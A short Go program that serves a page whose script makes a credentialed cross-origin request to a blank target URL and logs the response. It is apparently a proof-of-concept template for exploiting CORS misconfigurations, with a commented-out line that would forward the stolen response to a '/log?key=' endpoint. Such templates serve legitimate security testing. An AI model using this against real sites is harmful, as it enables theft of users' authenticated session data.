package main

import (
	"fmt"
	"net/http"
)

func mainHtml(w http.ResponseWriter, r *http.Request) {
	htmlContent := `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
   <script>
    const url = "";
    const req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get',url,true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        console.log(this.responseText);
        // location='/log?key='+this.responseText;
    };
   </script>
</body>
</html>
`

	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, htmlContent)
}

func main() {
	http.HandleFunc("/", mainHtml)

	var port = ":3000"
	fmt.Println("Starting server on " + port)
	if err := http.ListenAndServe(port, nil); err != nil {
		fmt.Println("Error starting server:", err)
	}
}
